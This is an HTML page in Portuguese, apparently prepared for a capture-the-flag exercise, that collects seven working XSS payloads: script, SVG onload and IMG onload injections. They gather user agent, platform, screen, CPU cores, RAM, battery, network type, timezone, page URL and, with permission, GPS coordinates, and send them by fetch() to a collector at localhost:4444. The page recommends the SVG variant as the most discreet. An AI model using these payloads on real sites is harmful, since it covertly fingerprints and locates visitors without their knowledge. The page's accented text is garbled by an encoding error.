<!DOCTYPE html>
<html>
<head>
    <title>XSS - Capturando Informa√ß√µes do Dispositivo</title>
</head>
<body>

<h2>Payloads XSS para capturar informa√ß√µes detalhadas do dispositivo</h2>

<h3>üì± M√©todo 1: Informa√ß√µes b√°sicas do navegador</h3>
<textarea rows="8" cols="100">
<script>
const info = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  cookieEnabled: navigator.cookieEnabled,
  onLine: navigator.onLine,
  screenWidth: screen.width,
  screenHeight: screen.height
};
fetch(`http://localhost:4444/debug-cookie?deviceInfo=${encodeURIComponent(JSON.stringify(info))}`);
</script>
</textarea>

<h3>üì± M√©todo 2: Informa√ß√µes completas do dispositivo</h3>
<textarea rows="15" cols="100">
<script>
const deviceInfo = {
  // Navegador
  userAgent: navigator.userAgent,
  vendor: navigator.vendor,
  appName: navigator.appName,
  appVersion: navigator.appVersion,
  platform: navigator.platform,
  oscpu: navigator.oscpu,
  
  // Idioma
  language: navigator.language,
  languages: navigator.languages,
  
  // Tela
  screenWidth: screen.width,
  screenHeight: screen.height,
  colorDepth: screen.colorDepth,
  pixelDepth: screen.pixelDepth,
  
  // Janela
  windowWidth: window.innerWidth,
  windowHeight: window.innerHeight,
  
  // Recursos
  cookieEnabled: navigator.cookieEnabled,
  javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
  onLine: navigator.onLine,
  
  // Localiza√ß√£o (se dispon√≠vel)
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  
  // URL atual
  url: location.href,
  referrer: document.referrer
};

fetch(`http://localhost:4444/debug-cookie?device=${encodeURIComponent(JSON.stringify(deviceInfo))}`);
</script>
</textarea>

<h3>üì± M√©todo 3: SVG onload com informa√ß√µes essenciais</h3>
<textarea rows="1" cols="100">
<svg onload="fetch(`http://localhost:4444/debug-cookie?ua=${encodeURIComponent(navigator.userAgent)}&platform=${navigator.platform}&screen=${screen.width}x${screen.height}&lang=${navigator.language}`)"></svg>
</textarea>

<h3>üì± M√©todo 4: Detec√ß√£o de dispositivo m√≥vel/desktop</h3>
<textarea rows="12" cols="100">
<script>
const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
const isTablet = /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent);

const deviceType = isMobile ? 'Mobile' : isTablet ? 'Tablet' : 'Desktop';

const info = {
  deviceType: deviceType,
  isMobile: isMobile,
  isTablet: isTablet,
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  screenResolution: `${screen.width}x${screen.height}`,
  browserLanguage: navigator.language,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
};

fetch(`http://localhost:4444/debug-cookie?deviceInfo=${encodeURIComponent(JSON.stringify(info))}`);
</script>
</textarea>

<h3>üì± M√©todo 5: Informa√ß√µes de hardware (quando dispon√≠vel)</h3>
<textarea rows="18" cols="100">
<script>
const getDeviceInfo = () => {
  const info = {
    // B√°sico
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    
    // Hardware
    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', // CPU cores
    deviceMemory: navigator.deviceMemory || 'N/A', // RAM em GB
    
    // Tela
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio
    },
    
    // Rede
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt
    } : 'N/A',
    
    // Sistema
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    
    // Bateria (se suportado)
    battery: 'Checking...'
  };
  
  // Tentar obter info da bateria
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      info.battery = {
        level: battery.level,
        charging: battery.charging
      };
      fetch(`http://localhost:4444/debug-cookie?fullDevice=${encodeURIComponent(JSON.stringify(info))}`);
    });
  } else {
    info.battery = 'Not supported';
    fetch(`http://localhost:4444/debug-cookie?fullDevice=${encodeURIComponent(JSON.stringify(info))}`);
  }
};

getDeviceInfo();
</script>
</textarea>

<h3>üì± M√©todo 6: Geolocaliza√ß√£o (com permiss√£o do usu√°rio)</h3>
<textarea rows="10" cols="100">
<script>
const deviceInfo = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  screen: `${screen.width}x${screen.height}`,
  language: navigator.language
};

// Tentar obter localiza√ß√£o
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    position => {
      deviceInfo.location = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy
      };
      fetch(`http://localhost:4444/debug-cookie?deviceWithLocation=${encodeURIComponent(JSON.stringify(deviceInfo))}`);
    },
    error => {
      deviceInfo.location = `Error: ${error.message}`;
      fetch(`http://localhost:4444/debug-cookie?deviceInfo=${encodeURIComponent(JSON.stringify(deviceInfo))}`);
    }
  );
} else {
  deviceInfo.location = 'Geolocation not supported';
  fetch(`http://localhost:4444/debug-cookie?deviceInfo=${encodeURIComponent(JSON.stringify(deviceInfo))}`);
}
</script>
</textarea>

<h3>üì± M√©todo 7: IMG onload compacto</h3>
<textarea rows="1" cols="100">
<img src=x onload="fetch(`http://localhost:4444/debug-cookie?device=${encodeURIComponent(navigator.userAgent)}&screen=${screen.width}x${screen.height}&platform=${navigator.platform}&cores=${navigator.hardwareConcurrency||0}`)">
</textarea>

<hr>

<h3>üìä Informa√ß√µes que podem ser capturadas:</h3>

<h4>üñ•Ô∏è Sistema Operacional:</h4>
<ul>
    <li><strong>navigator.platform:</strong> "Win32", "MacIntel", "Linux x86_64", etc.</li>
    <li><strong>navigator.userAgent:</strong> String completa com OS, navegador, vers√£o</li>
    <li><strong>navigator.oscpu:</strong> Informa√ß√µes da CPU (Firefox)</li>
</ul>

<h4>üì± Dispositivo:</h4>
<ul>
    <li><strong>Tipo:</strong> Desktop, Mobile, Tablet (via user-agent)</li>
    <li><strong>Marca:</strong> iPhone, Samsung, etc. (via user-agent)</li>
    <li><strong>Resolu√ß√£o:</strong> screen.width x screen.height</li>
    <li><strong>Cores CPU:</strong> navigator.hardwareConcurrency</li>
    <li><strong>RAM:</strong> navigator.deviceMemory (Chrome)</li>
</ul>

<h4>üåê Navegador:</h4>
<ul>
    <li><strong>Nome/Vers√£o:</strong> Chrome, Firefox, Safari, etc.</li>
    <li><strong>Idioma:</strong> navigator.language</li>
    <li><strong>Plugins:</strong> navigator.plugins</li>
    <li><strong>Cookies habilitados:</strong> navigator.cookieEnabled</li>
</ul>

<h4>üîã Hardware (quando dispon√≠vel):</h4>
<ul>
    <li><strong>Bateria:</strong> n√≠vel, carregando (navigator.getBattery)</li>
    <li><strong>Conex√£o:</strong> tipo de rede, velocidade (navigator.connection)</li>
    <li><strong>Localiza√ß√£o:</strong> GPS coordinates (com permiss√£o)</li>
</ul>

<h3>üéØ Para CTF - Recomenda√ß√£o:</h3>
<p><strong>Use o M√©todo 2 ou 4</strong> para m√°xima informa√ß√£o sem precisar de permiss√µes especiais.</p>

<p><strong>Para ser mais discreto, use o M√©todo 3 (SVG):</strong></p>
<code>&lt;svg onload="fetch(`http://localhost:4444/debug-cookie?ua=${encodeURIComponent(navigator.userAgent)}&platform=${navigator.platform}&screen=${screen.width}x${screen.height}`)"/&gt;</code>

</body>
</html>